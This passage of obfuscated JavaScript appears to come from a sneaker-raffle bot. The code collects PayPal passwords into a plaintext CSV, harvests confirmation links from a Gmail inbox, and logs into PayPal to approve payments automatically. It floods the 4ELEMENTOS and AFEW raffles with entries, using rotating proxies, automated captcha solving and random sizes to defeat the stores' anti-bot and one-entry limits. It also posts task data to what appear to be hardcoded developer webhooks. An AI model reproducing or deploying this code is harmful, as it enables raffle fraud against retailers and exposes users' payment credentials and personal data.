        _0x59a443['Email'] = _0x25c2fd['Email'];
        var _0x10b029 = Math['round'](Math['random']() * (_0x249852['length'] - 0x1));
        _0x59a443['Proxy'] = _0x249852[_0x10b029], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x57848c = await _0x44d22d['get']('Password');
        return _0x59a443['Password'] = _0x57848c['Password'], _0x4a3ff4['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x59a443['Email'] + ',' + _0x59a443['Password'] + ',' + _0x59a443['Proxy']), _0x59a443;
    }
    let _0x4edcec = await _0x34ce38();
    var _0x471b70 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x4e1b98 = await _0x44d22d['get']('Amount'), _0x3240bc = _0x4e1b98['Amount'];
    async function _0x387979() {
        let _0x55cd0c = 0x0;
        var _0xcd62d4 = new _0x2b87aa({
            'user': _0x579cef['masterMail'],
            'password': _0x579cef['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x2daf2b(_0x1a05aa) {
            _0xcd62d4['openBox']('INBOX', ![], _0x1a05aa);
        }
        _0xcd62d4['once']('ready', function () {
            _0x2daf2b(function (_0x5adc23, _0x27b54c) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x5adc23)
                    throw _0x5adc23;
                _0xcd62d4['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x559560, _0x3364d4) {
                    if (!_0x3364d4 || !_0x3364d4['length'])
                        console['log'](_0x11b348() + '\x20[' + _0x4e7501 + ']\x20No\x20mails\x20found'), _0xcd62d4['end']();
                    else {
                        _0x3364d4 = _0x3364d4['slice'](0x0, _0x3240bc);
                        var _0x454e69 = _0xcd62d4['seq']['fetch'](_0x3364d4, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x454e69['on']('message', function (_0x3d29ae, _0x4598fe) {
                            var _0x5243ad = '(#' + _0x4598fe + ')\x20';
                            _0x3d29ae['on']('body', function (_0x2d99ee, _0x560cee) {
                                _0x554795(_0x2d99ee, (_0x46a9a3, _0x50347d) => {
                                    if (_0x50347d['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x50347d['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x50347d['text']['split']('[')[0x2];
                                        var _0x37aa92 = mes['split'](']')[0x0];
                                        _0x471b70['push'](_0x37aa92);
                                    }
                                });
                            }), _0x3d29ae['once']('end', function () {
                                _0x55cd0c++;
                            });
                        }), _0x454e69['once']('error', function (_0x126e55) {
                            console['log']('Fetch\x20error:\x20' + _0x126e55);
                        }), _0x454e69['once']('end', function () {
                            _0xcd62d4['end']();
                        });
                    }
                });
            });
        }), _0xcd62d4['once']('error', function (_0x3f77dd) {
            console['log'](_0x218a39['red'](_0x3f77dd['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0xcd62d4['once']('end', async function () {
        }), _0xcd62d4['connect']();
    }
    try {
        _0x387979(), await _0xaebb71(0xfa0), console['log']('Found\x20' + _0x471b70['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xaebb71(0xfa0);
    }
    var _0x13329b;
    _0x3e0125('' + _0x4e7501);
    var _0x7be103 = _0x4edcec['Proxy']['split'](':'), _0x28ff96;
    try {
        _0x28ff96 = await _0x181ece['launch']({
            'userDataDir': 'sessions/' + _0x4edcec['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x7be103[0x0] + ':' + _0x7be103[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x28ff96 = await _0x181ece['launch']({
            'userDataDir': 'sessions/' + _0x4edcec['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x7be103[0x0] + ':' + _0x7be103[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x11b348() + '\x20[' + _0x4e7501 + ']\x20Getting\x20Session');
        const _0x3504e5 = await _0x28ff96['newPage']();
        await _0x3504e5['authenticate']({
            'username': '' + _0x7be103[0x2],
            'password': '' + _0x7be103[0x3]
        }), await _0x3504e5['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x3504e5['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x11b348() + '\x20[' + _0x4e7501 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x3504e5['waitForSelector']('#email');
            let _0x47b2ca = await _0x3504e5['$eval']('#email', _0x58b79c => _0x58b79c['getAttribute']('value'));
            if (_0x47b2ca == '') {
                await _0x3504e5['type']('#email', _0x4edcec['Email']), await _0xaebb71(0x1d3);
                let _0x14f488 = await _0x3504e5['$']('#splitPassword');
                _0x14f488 && (await _0x3504e5['click']('#btnNext'), await _0xaebb71(0xa28)), await _0x3504e5['type']('#password', _0x4edcec['Password']), await _0xaebb71(0x35c), await _0x3504e5['click']('#btnLogin');
            } else
                await _0x3504e5['type']('#password', _0x4edcec['Password']), await _0xaebb71(0x35c), await _0x3504e5['click']('#btnLogin');
            await _0x3504e5['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x11b348() + '\x20[' + _0x4e7501 + ']\x20Successfully\x20logged\x20in'), await _0xaebb71(0x2710);
        } catch (_0x3f6362) {
            throw new Error('Login\x20session\x20expired\x20' + _0x3f6362);
        }
        for (var _0x413b55 = 0x0; _0x413b55 < _0x471b70['length']; _0x413b55++) {
            console['log'](_0x11b348() + '\x20[' + _0x4e7501 + ']\x20Task\x20' + (_0x413b55 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x3e0125(_0x4e7501 + '\x20Task\x20' + (_0x413b55 + 0x1) + '\x20/\x20' + _0x471b70['length']);
            const _0x41f800 = await _0x28ff96['newPage']();
            await _0x41f800['goto']('' + _0x471b70[_0x413b55], { 'waitUntil': 'networkidle2' }), await _0xaebb71(0xbb8);
            try {
                const _0x220887 = await _0x41f800['$']('#challenge-heading');
                _0x220887 && (console['log'](_0x11b348() + '\x20[' + _0x4e7501 + ']\x20Task\x20' + (_0x413b55 + 0x1) + '\x20:\x20' + _0x218a39['yellow']('2FA\x20Required')), await _0x41f800['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0xaebb71(0x9c40), await _0x41f800['waitForSelector']('#payment-submit-btn'), await _0x41f800['$eval']('#payment-submit-btn', _0x2bd1af => _0x2bd1af['click']()), await _0x41f800['click']('#payment-submit-btn');
                try {
                    await _0x41f800['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0xaebb71(0x5dc), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x4e7501 + ']\x20Task\x20' + (_0x413b55 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x30f2f3) {
                    _0x5c0d77 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x30f2f3['message']);
                } finally {
                    if (_0x5c0d77 == 'yes' && _0x21713d != 0x2) {
                        console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x4e7501['name'] + ']\x20Task\x20' + (_0x413b55 + 0x1) + '\x20:\x20Retrying\x20(' + _0x21713d + '\x20/\x205)')), _0x413b55 = _0x413b55 - 0x1, _0x21713d = _0x21713d + 0x1;
                        continue;
                    }
                    _0x5c0d77 == 'yes' && _0x21713d >= 0x2 && (_0x47d653(csv[_0x413b55], _0x4e7501), _0x5c0d77 = 'no', _0x21713d = 0x0), await _0x41f800['close'](), await _0xaebb71(0x4650);
                }
            } catch (_0x40a424) {
                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x4e7501 + ']\x20Task\x20' + (_0x413b55 + 0x1) + '\x20:\x20' + _0x40a424));
            }
        }
    } catch (_0xd393f6) {
        console['log'](_0x218a39['red']('' + _0xd393f6));
    } finally {
        await _0x28ff96['close']();
    }
}
const _0x5f903f = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x2bf1e2, _0x24c394, _0x57091c) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1beaf9 = 0x0; _0x1beaf9 < _0x24c394['length']; _0x1beaf9++) {
                        if (_0x8fb9ee != 'yes')
                            var _0x8fb9ee = '', _0x962ff3 = 0x0;
                        var _0x26810e;
                        try {
                            await _0x48a0b3(_0x24c394, _0x1beaf9);
                        } catch {
                            _0x8fb9ee = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3e0125(_0x2bf1e2['name'] + '\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20/\x20' + _0x24c394['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        var _0x5d84a9 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x54d17c = Math['round'](Math['random']() * (_0x5d84a9['length'] - 0x1));
                        _0x24c394[_0x1beaf9]['Size'] == 'RANDOM' && (_0x24c394[_0x1beaf9]['Size'] = _0x5d84a9[_0x54d17c]);
                        var _0x4b6876 = Math['round'](Math['random']() * (_0x57091c['length'] - 0x1)), _0xa17656 = _0x57091c[_0x4b6876]['split'](':'), _0x2693af;
                        try {
                            _0x2693af = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xa17656[0x0] + ':' + _0xa17656[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2693af = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xa17656[0x0] + ':' + _0xa17656[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x1f5730 = await _0x2693af['newPage']();
                            await _0x1f5730['authenticate']({
                                'username': '' + _0xa17656[0x2],
                                'password': '' + _0xa17656[0x3]
                            }), await _0x1f5730['setRequestInterception'](!![]), _0x1f5730['on']('request', _0xf2e142 => {
                                _0xf2e142['resourceType']() === 'image' || _0xf2e142['resourceType']() === 'font' || _0xf2e142['resourceType']() === 'media' ? _0xf2e142['abort']() : _0xf2e142['continue']();
                            }), await _0x1f5730['goto'](_0x24c394[_0x1beaf9]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x1f5730['waitForSelector']('#accept-all-gdpr'), await _0x1f5730['click']('#accept-all-gdpr'), await _0x1f5730['waitForSelector']('#raffles-product'), await _0xaebb71(0x3e8), await _0x1f5730['$eval']('#raffles-product', _0x1b0d02 => _0x1b0d02['click']()), await _0xaebb71(0x1388), await _0x1f5730['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x5387aa = await _0x1f5730['$']('.fancybox-inner\x20>\x20iframe'), _0x72b80d = await _0x5387aa['contentFrame']();
                            console['log'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x72b80d['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0xaebb71(0x1f4), await _0x72b80d['type']('input[name=\x22sm-form-email\x22]', _0x24c394[_0x1beaf9]['Email']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-form-name\x22]', _0x24c394[_0x1beaf9]['FirstName'] + '\x20' + _0x24c394[_0x1beaf9]['LastName']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-form-street\x22]', _0x24c394[_0x1beaf9]['Address1'] + '\x20' + _0x24c394[_0x1beaf9]['HouseNumber'] + '\x20' + _0x24c394[_0x1beaf9]['Address2']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-form-city\x22]', _0x24c394[_0x1beaf9]['City']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-form-province\x22]', _0x24c394[_0x1beaf9]['State']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-form-zip\x22]', _0x24c394[_0x1beaf9]['Zip']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-form-country\x22]', _0x24c394[_0x1beaf9]['Country']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-form-phone\x22]', _0x24c394[_0x1beaf9]['Phone']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x24c394[_0x1beaf9]['Follower']), await _0xaebb71(0xc8), await _0x72b80d['type']('input[name=\x22sm-cst.size\x22]', _0x24c394[_0x1beaf9]['Size']), await _0xaebb71(0x1f4), await _0x72b80d['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0xaebb71(0x1f4), await _0x72b80d['click']('.icheckbox_simple-custom'), await _0xaebb71(0x1f4), console['log'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x72b80d['$eval']('form', _0x2d853b => _0x2d853b['submit']()), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x8fb9ee = '';
                            var _0x298b05 = await _0x3ead77(_0x24c394[_0x1beaf9], _0x2bf1e2, 'dev', ![]), _0xf331ae = await _0x3ead77(_0x24c394[_0x1beaf9], _0x2bf1e2, 'pub', ![]);
                            const _0x2f7754 = {
                                'succesDEVMSG': { 'embeds': [_0x298b05] },
                                'succesPUBMSG': { 'embeds': [_0xf331ae] }
                            };
                            try {
                                _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x2f7754['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x2f7754['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x2aae93, _0x2f7754['succesPUBMSG']);
                            } catch (_0x55df74) {
                                console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x55df74));
                            }
                        } catch (_0x549d29) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20:\x20' + _0x549d29)), _0x26810e = '' + _0x549d29;
                            var _0x54dc28 = await _0x3ead77(_0x24c394[_0x1beaf9], _0x2bf1e2, 'dev', !![], _0x26810e), _0x298b05 = await _0x3ead77(_0x24c394[_0x1beaf9], _0x2bf1e2, 'dev', ![]), _0xf331ae = await _0x3ead77(_0x24c394[_0x1beaf9], _0x2bf1e2, 'pub', ![]);
                            const _0x2834d8 = {
                                'succesDEVMSG': { 'embeds': [_0x298b05] },
                                'succesPUBMSG': { 'embeds': [_0xf331ae] }
                            };
                            _0x2834d8['errorDEV'] = { 'embeds': [_0x54dc28] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x2834d8['errorDEV']), await _0x4401f2(_0x2631ac, _0x2834d8['errorDEV']), _0x549d29 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x8fb9ee = 'yes');
                        } finally {
                            _0x2693af['close']();
                            if (_0x8fb9ee == 'yes' && _0x962ff3 != 0x5 && _0x26810e != 'Size\x20Not\x20Found') {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Task\x20' + (_0x1beaf9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x962ff3 + '\x20/\x205)\x20')), _0x1beaf9 = _0x1beaf9 - 0x1, _0x962ff3 = _0x962ff3 + 0x1;
                                continue;
                            }
                            _0x8fb9ee == 'yes' && _0x962ff3 >= 0x5 && (_0x47d653(_0x24c394[_0x1beaf9], _0x2bf1e2), _0x8fb9ee = 'no', _0x962ff3 = 0x0), console['log'](_0x11b348() + '\x20[' + _0x2bf1e2['name'] + ']\x20Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x10ea2d, _0x4acfb5) {
                    var _0xce8af = [];
                    async function _0x1b8c3e() {
                        var _0xd3b743 = new _0x2b87aa({
                            'user': _0x579cef['masterMail'],
                            'password': _0x579cef['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x279301(_0x58fe50) {
                            _0xd3b743['openBox']('INBOX', ![], _0x58fe50);
                        }
                        _0xd3b743['once']('ready', function () {
                            _0x279301(function (_0x49142e, _0x354dfb) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x49142e)
                                    throw _0x49142e;
                                _0xd3b743['seq']['search'](['UNSEEN'], function (_0x529b83, _0x2dd912) {
                                    if (!_0x2dd912 || !_0x2dd912['length'])
                                        console['log'](_0x11b348() + '\x20[' + _0x10ea2d['name'] + ']\x20No\x20mails\x20found'), _0xd3b743['end']();
                                    else {
                                        var _0x41317f = _0xd3b743['seq']['fetch'](_0x2dd912, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x41317f['on']('message', function (_0x5270f4, _0x1b8cc4) {
                                            var _0x48bfc0 = '(#' + _0x1b8cc4 + ')\x20';
                                            _0x5270f4['on']('body', function (_0x22b0af, _0x1f3542) {
                                                _0x554795(_0x22b0af, (_0x14a66e, _0x502431) => {
                                                    if (_0x502431['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x11975c = _0x502431['html']['split']('\x0a');
                                                        for (var _0x36be40 = 0x0; _0x36be40 < _0x11975c['length']; _0x36be40++) {
                                                            if (_0x11975c[_0x36be40]['includes']('salesmanago') && _0x11975c[_0x36be40]['includes']('<td') && _0x11975c[_0x36be40]['includes']('href')) {
                                                                var _0x2927b4 = _0x11975c[_0x36be40]['split']('href=\x22'), _0xeb5537 = _0x2927b4[0x1]['split']('\x22')[0x0];
                                                                _0xce8af['push'](_0xeb5537);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x5270f4['once']('end', function () {
                                            });
                                        }), _0x41317f['once']('error', function (_0x502a12) {
                                            console['log']('Fetch\x20error:\x20' + _0x502a12);
                                        }), _0x41317f['once']('end', function () {
                                            _0xd3b743['end']();
                                        });
                                    }
                                });
                            });
                        }), _0xd3b743['once']('error', function (_0x196e91) {
                            console['log'](_0x218a39['red'](_0x196e91['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0xd3b743['once']('end', async function () {
                        }), _0xd3b743['connect']();
                    }
                    async function _0x17b290(_0x167fd5, _0x336434, _0x5e7ebc) {
                        for (var _0x3de807 = 0x0; _0x3de807 < _0x336434['length']; _0x3de807++) {
                            async function _0x3130c8(_0x4e0d65, _0x30ce48, _0x19a14d, _0x4715e9, _0x1fa1bb) {
                                var _0x41aa75, _0x2b05e4 = {}, _0x260ec1 = [], _0x3a9b1e = {}, _0x27e458 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1557eb = Math['round'](Math['random']() * (_0x27e458['length'] - 0x1));
                                _0x4715e9[_0x4e0d65]['Size'] == 'RANDOM' && (_0x4715e9[_0x4e0d65]['Size'] = _0x27e458[_0x1557eb]);
                                !_0x4715e9 && (_0x4715e9 = {});
                                if (_0x579cef['useRandomProxy'] = ![])
                                    var _0x21c553 = _0x1fa1bb[_0x4e0d65]['split'](':');
                                else
                                    var _0x375597 = Math['round'](Math['random']() * (_0x1fa1bb['length'] - 0x1)), _0x21c553 = _0x1fa1bb[_0x375597]['split'](':');
                                var _0x2056be = {
                                    'jar': _0x453a7b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x19a14d['url'],
                                    'headers': _0x19a14d['headers'],
                                    'body': JSON['stringify'](_0x2b05e4),
                                    'proxy': 'http://' + _0x21c553[0x2] + ':' + _0x21c553[0x3] + '@' + _0x21c553[0x0] + ':' + _0x21c553[0x1]
                                };
                                return _0x30ce48 != 'ver' && (_0x2056be['url'] = _0x19a14d['url'], _0x2056be['headers'] = _0x19a14d['headers']), _0x30ce48 == 'ver' && (_0x2056be['method'] = 'GET', _0x2056be['url'] = _0x4715e9[_0x4e0d65]), new Promise(function (_0xb96190, _0x42117a) {
                                    callback = async (_0x16be13, _0x1ae19a, _0x52c673) => {
                                        if (!_0x16be13 && _0x1ae19a['statusCode'] == 0xca || !_0x16be13 && _0x1ae19a['statusCode'] == 0xc8) {
                                            if (_0x30ce48 != 'ver') {
                                                var _0xd04266 = await _0x3ead77(_0x4715e9[_0x4e0d65], _0x19a14d, 'dev', ![]), _0x911b0f = await _0x3ead77(_0x4715e9[_0x4e0d65], _0x19a14d, 'pub', ![]);
                                                const _0x5d71ba = {
                                                    'succesDEVMSG': { 'embeds': [_0xd04266] },
                                                    'succesPUBMSG': { 'embeds': [_0x911b0f] }
                                                };
                                                if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                                                    try {
                                                        await _0x4401f2(_0x579cef['webhook'], _0x5d71ba['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x5d71ba['succesDEVMSG']), await _0xaebb71(0xc8);
                                                try {
                                                    await _0x4401f2(_0x2aae93, _0x5d71ba['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x20f501(_0x4715e9[_0x4e0d65], _0x19a14d);
                                            }
                                            _0xb96190(console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x19a14d['name'] + ']\x20Task\x20' + (_0x4e0d65 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x30ce48 != 'ver') {
                                                var _0x4a351a = '' + _0x16be13, _0x110e4f = await _0x3ead77(_0x4715e9[_0x4e0d65], _0x19a14d, 'dev', !![], _0x4a351a), _0x22a3d9 = {};
                                                _0x22a3d9['errorDEV'] = { 'embeds': [_0x110e4f] }, _0x47d653(_0x4715e9[_0x4e0d65], _0x19a14d), _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x22a3d9['errorDEV']), await _0x4401f2(_0x2631ac, _0x22a3d9['errorDEV']);
                                            }
                                            _0x42117a(console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x19a14d['name'] + ']\x20Task\x20' + (_0x4e0d65 + 0x1) + ':\x20' + _0x16be13)));
                                        }
                                    };
                                    try {
                                        _0x30ce48 != 'ver' ? console['log'](_0x11b348() + '\x20[' + _0x19a14d['name'] + ']\x20Task\x20' + (_0x4e0d65 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2b05e4['data']['attributes']['email']) : console['log'](_0x11b348() + '\x20[' + _0x19a14d['name'] + ']\x20Task\x20' + (_0x4e0d65 + 0x1) + ':\x20Fetching\x20Response'), _0x35490a(_0x2056be, callback);
                                    } catch (_0x37675d) {
                                        console['log'](_0x11b348() + '\x20Task\x20' + (_0x4e0d65 + 0x1) + ':\x20' + _0x37675d);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3130c8(_0x3de807, 'ver', _0x167fd5, _0x336434, _0x5e7ebc), console['log'](_0x11b348() + '\x20[' + _0x167fd5['name'] + ']\x20Sleeping\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                            } catch (_0x5a9d29) {
                            }
                        }
                    }
                    try {
                        _0x1b8c3e(), await _0xaebb71(0xfa0), console['log']('Found\x20' + _0xce8af['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x17b290(_0x10ea2d, _0xce8af, _0x4acfb5);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x125b72, _0x26e782, _0x4b9469) {
                for (var _0x3a126c = 0x0; _0x3a126c < _0x26e782['length']; _0x3a126c++) {
                    _0x579cef['AfewDelay'] = _0x579cef['delay'];
                    var _0x57a4b6;
                    if (_0x1d66e9 != 'yes')
                        var _0x1d66e9 = '', _0x262ebc = 0x0;
                    var _0x54618c = _0x26e782[_0x3a126c]['Url'], _0x5660f0 = _0x26e782[_0x3a126c];
                    _0x3e0125(_0x125b72['name'] + '\x20Task\x20' + (_0x3a126c + 0x1) + '\x20/\x20' + _0x26e782['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                    try {
                        await _0x48a0b3(_0x26e782, _0x3a126c);
                    } catch {
                        _0x1d66e9 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0xa9b702(_0x1eaf4f) {
                        const _0x1aa3f6 = _0x4a3ff4['readFileSync']('../successful-tasks.csv', 'utf8'), _0x29bf94 = _0x566459['parse'](_0x1aa3f6, { 'header': !![] })['data'];
                        let _0x473e3b = ![];
                        for (var _0x34d0a6 of _0x29bf94) {
                            if (_0x34d0a6['Url'] == _0x1eaf4f['Url'] && _0x34d0a6['Email'] == _0x1eaf4f['Email']) {
                                _0x473e3b = !![];
                                break;
                            }
                        }
                        return _0x473e3b;
                    }
                    if (await _0xa9b702(_0x26e782[_0x3a126c]) == !![]) {
                        console['log'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x4cdf5f = await _0x3ead77(_0x26e782[_0x3a126c], _0x125b72, 'dev', ![]), _0x2dd101 = await _0x3ead77(_0x26e782[_0x3a126c], _0x125b72, 'pub', ![]);
                    const _0x37b6b3 = {
                        'succesDEVMSG': { 'embeds': [_0x4cdf5f] },
                        'succesPUBMSG': { 'embeds': [_0x2dd101] }
                    };
                    if (_0x26e782[_0x3a126c]['Email'] == '' || _0x26e782[_0x3a126c]['FirstName'] == '' || _0x26e782[_0x3a126c]['LastName'] == '' || _0x26e782[_0x3a126c]['Country'] == '' || _0x26e782[_0x3a126c]['Size'] == '' || _0x26e782[_0x3a126c]['Address1'] == '' || _0x26e782[_0x3a126c]['Zip'] == '') {
                        console['log'](_0x11b348() + '\x20[' + _0x125b72['name'] + ']\x20Task\x20' + (_0x3a126c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x579cef['useRandomProxy'] = ![])
                        var _0x552d2b = _0x4b9469[_0x3a126c]['split'](':');
                    else
                        var _0x417c7f = Math['round'](Math['random']() * (_0x4b9469['length'] - 0x1)), _0x552d2b = _0x4b9469[_0x417c7f]['split'](':');
                    var _0x284293;
                    try {
                        _0x284293 = await _0x181ece['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x552d2b[0x0] + ':' + _0x552d2b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x284293 = await _0x181ece['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
